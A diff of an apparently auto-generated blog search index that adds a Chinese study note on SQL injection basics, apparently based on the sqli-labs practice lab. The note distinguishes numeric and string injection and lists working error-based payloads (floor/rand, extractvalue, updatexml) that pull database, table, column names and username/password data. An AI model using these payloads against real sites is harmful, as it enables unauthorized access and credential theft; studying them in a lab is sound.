@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>sql注入基本知识</title>
+      <link href="/2023/04/24/sql%E6%B3%A8%E5%85%A5/"/>
+      <url>/2023/04/24/sql%E6%B3%A8%E5%85%A5/</url>
+      
+        <content type="html"><![CDATA[<p>url中?表示传参，id表示变量，</p><p>参数类型</p><ol><li>数字型：当输入的参数为整形时，如果存在注入漏洞，可以认为是数字型注入。</li></ol><p>如 <a href="http://www.text.com/text.php?id=3">www.text.com/text.php?id=3</a> 对应的sql语句为 select * from table where id=3</p><ol start="2"><li>字符型：字符型注入正好相反</li></ol><p>当输入的参数被当做字符串时，称为字符型。字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过引号来闭合的。即看参数是否被引号包裹</p><p>例如数字型语句：select * from table where id =3</p><p>则字符型如下：select * from table where name=’admin’</p><p>注入手法的话可以分为以下几类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">联合查询注入：union selest</span><br><span class="line">报错注入：</span><br><span class="line">group by（重复键冲）</span><br><span class="line">?id=1&#x27; and (select 1 from (select count(*),concat((select 查询的内容 from information_schema.tables limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a) --+</span><br><span class="line"> extractvalue() 函数</span><br><span class="line">?id=1&#x27; and extractvalue(1,concat(&#x27;^&#x27;,(select database()),&#x27;^&#x27;)) --+</span><br><span class="line"> updatexml() 函数</span><br><span class="line">获取数据库名字?id=1&#x27; and updatexml(1,concat(&#x27;^&#x27;,(database()),&#x27;^&#x27;),1) --+</span><br><span class="line">获取当前数据库中表的名字?id=1&#x27; and updatexml(1,concat(&#x27;^&#x27;,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; ),&#x27;^&#x27;),1) --+</span><br><span class="line">爆表中的字段?id=1&#x27; and updatexml(1,concat(&#x27;^&#x27;,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27; limit 0,1 ),&#x27;^&#x27;),1) --+</span><br><span class="line">爆字段中的内容?id=1&#x27; and updatexml(1,concat(&#x27;^&#x27;,(select group_concat(username,&quot;--&quot;,password)   from users limit 0,1 ),&#x27;^&#x27;),1) --+</span><br><span class="line">布尔盲注</span><br><span class="line">时间盲注</span><br><span class="line">多语句查询注入：</span><br><span class="line">https://blog.csdn.net/qq_44159028/article/details/114325805</span><br></pre></td></tr></table></figure><p>布尔盲注和时间盲注直接用sqlmap注入吧</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> web </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>sqlmap使用指北</title>
       <link href="/2023/04/24/sqlmap%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/"/>
       <url>/2023/04/24/sqlmap%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</url>
@@ -23,7 +42,7 @@
     
     
     <entry>
-      <title>sqllibs</title>
+      <title>sqllibs10</title>
       <link href="/2023/04/24/sqllibs10/"/>
       <url>/2023/04/24/sqllibs10/</url>
       
